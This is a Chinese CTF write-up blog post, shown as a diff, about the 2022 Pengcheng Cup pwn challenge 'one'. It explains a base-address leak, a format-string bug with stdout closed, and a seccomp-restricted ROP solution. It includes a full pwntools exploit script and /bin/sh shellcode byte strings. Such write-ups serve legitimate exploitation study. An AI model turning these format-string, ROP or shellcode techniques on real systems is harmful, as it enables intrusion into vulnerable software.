@@ -1,0 +1,149 @@
+---
+title: 2022 鹏城杯 pwn 复现
+date: 2022-07-23 12:54:59 +0800
+categories: [ctf比赛]
+tags: [pwn, ctf]
+permalink: /posts/id=37/
+pin: false
+published:
+---
+
+## one
+
+![image-20220726214513516](https://e4l4pic.oss-cn-beijing.aliyuncs.com/img/image-20220726214513516.png)
+
+![image-20220726232007958](https://e4l4pic.oss-cn-beijing.aliyuncs.com/img/image-20220726232007958.png)
+
+题目开了黑名单沙箱，ban了execve。给了一个栈地址，然后就是一个login函数，memset只清空了8字节，存在程序基地址泄露。
+
+后续关闭了输出流，然后一个无溢出的格式化字符串
+
+![image-20220726231924262](https://e4l4pic.oss-cn-beijing.aliyuncs.com/img/image-20220726231924262.png)
+
+![image-20220726232106725](https://e4l4pic.oss-cn-beijing.aliyuncs.com/img/image-20220726232106725.png)
+
+考虑恢复输出流，程序里没有多余的函数，没有办法通过类open的方式恢复。
+
+考虑修改stdout_fileno字段，题目给了一个栈地址，格式化字符串改ret就能实现循环。(改任意地址为任意值至少需要2次)
+
+第一次我们泄露基地址，拿到start的地址，用于后续执行后能在栈上留下stdout的指针
+
+第二次劫持printf_ret为start，同时修改栈上的IO_stdout低2字节为fileno字段地址，爆破一下
+
+第三次还是改返回到start，同时修改fileno，泄露libc
+
+第四次直接改返回到gadget，去跳转执行我们栈上写的rop链
+
+整个过程主要思路是去构造循环，恢复输出流，泄露libc，ret2orw
+
+![image-20220726232411717](https://e4l4pic.oss-cn-beijing.aliyuncs.com/img/image-20220726232411717.png)
+
+![image-20220727102123585](https://e4l4pic.oss-cn-beijing.aliyuncs.com/img/image-20220727102123585.png)
+
+
+
+```python
+# _*_ coding:utf-8 _*_
+from pwn import *
+import random
+# context.log_level='debug'
+context(os="linux",arch="amd64")
+
+
+def dbg():
+    gdb.attach(p)
+#-----------------------------------------------------------------------------------------
+s       = lambda data               :p.send(str(data))
+sa      = lambda text,data          :p.sendafter(text, str(data))
+sl      = lambda data               :p.sendline(str(data))
+sla     = lambda text,data          :p.sendlineafter(text, str(data))
+r       = lambda num=4096           :p.recv(num)
+ru      = lambda text               :p.recvuntil(text)
+uu32    = lambda                    :u32(p.recvuntil("\xf7")[-4:].ljust(4,"\x00"))
+uu64    = lambda                    :u64(p.recvuntil("\x7f")[-6:].ljust(8,"\x00"))
+lg      = lambda s                  :p.success('%s -> 0x%x' % (s, eval(s)))
+
+sh_x86_18="\x6a\x0b\x58\x53\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"
+sh_x86_20="\x31\xc9\x6a\x0b\x58\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"
+sh_x64_21="\xf7\xe6\x50\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x48\x89\xe7\xb0\x3b\x0f\x05"
+#https://www.exploit-db.com/shellcodes
+#-----------------------------------------------------------------------------------------
+
+
+while True:
+    p = process("./pwn")
+    elf = ELF("./pwn")
+    libc = elf.libc
+    try:
+        ru("gift:")
+        stack = int(p.recvline(),16)
+        lg('stack')
+
+        sa("username:",'a'*8)
+        sa("password:",'a'*8)
+        p.recvuntil('a'*8)
+        start = u64(p.recv(6).ljust(8,'\x00'))
+        base = start-0x11a0
+        lg('start')
+
+        p.recvuntil("!!")
+        p.send(fmtstr_payload(6, {stack+0x818:start}).ljust(0x200,"\x00"))
+        #-----------------------------------------------
+        # prepare replace addr/num
+        fmt = ""
+        data = ""
+        pre = 0
+        # edit IO_stdout to fileno
+        editnum = [0x10,0x37]
+        editaddr = [stack-0x140,stack-0x140+1]
+        # edit ret
+        addr = start
+        for i in range(6):
+            editnum.append(addr&0xff)# 0xff low bit
+            editaddr.append(stack-0x1c8+i)# 0x180
+            addr = addr>>8
+        #-----------------------------------------------
+        # make small->big
+        for j in range(8):
+            num = 0xffff
+            for i in range(8):# 8
+                if (editnum[i] < num):# minest
+                    num = editnum[i]
+                    idx = i
+        
+            fmt += "%"+str(num-pre)+"c%"+str(j+22)+"$hhn"
+            data += p64(editaddr[idx])
+            editnum[idx] = 0xff
+            pre = num
+        #-----------------------------------------------
+        p.send("a"*0x8)
+        p.send("a"*0x8)
+        p.send((fmt.ljust(0x80,"\x00")+data).ljust(0x200,"\x00"))
+        #-----------------------------------------------
+        # edit fileno and leak libc and edit ret
+        p.send("a"*0x8)
+        p.send("a"*0x8)
+        p.send("%2c%310$hhn;%310$p".ljust(0x18)+fmtstr_payload(9,{stack-0x2a8:start}, numbwritten=0x17))
+        p.recvuntil(";")
+        libc_base=int(p.recv(14),16)-libc.sym["_IO_2_1_stdout_"]-112
+        lg('libc_base')
+        #-----------------------------------------------
+        # edit ret to orw
+        add_rsp = libc_base+0x24242#0x0000000000024242: add rsp, 0x98; ret;
+        pop_rax = libc_base+0x36174
+        pop_rdi = base + 0x1543
+        pop_rsi = libc_base+0x2601f
+        pop_rdx = libc_base+0x142c92
+
+        payload =  p64(pop_rdi)+p64(stack-0xb20)+p64(pop_rsi)+p64(0)+p64(libc_base+libc.sym["open"])
+        payload += p64(pop_rdi)+p64(1)+p64(pop_rsi)+p64(libc_base+libc.sym["environ"])+p64(pop_rdx)+p64(0x30)+p64(libc_base+libc.sym["read"])
+        payload += p64(pop_rdi)+p64(2)+p64(libc_base+libc.sym["write"])
+        sa("username:",'a'*8)
+        sa("password:",'a'*8)
+        p.recv()
+        p.send(fmtstr_payload(6, {stack-0xba8:add_rsp}).ljust(0x80,"\x00")+"flag".ljust(0x18,"\x00")+payload)
+        p.interactive()
+    except:
+        p.close()
+        continue
+```
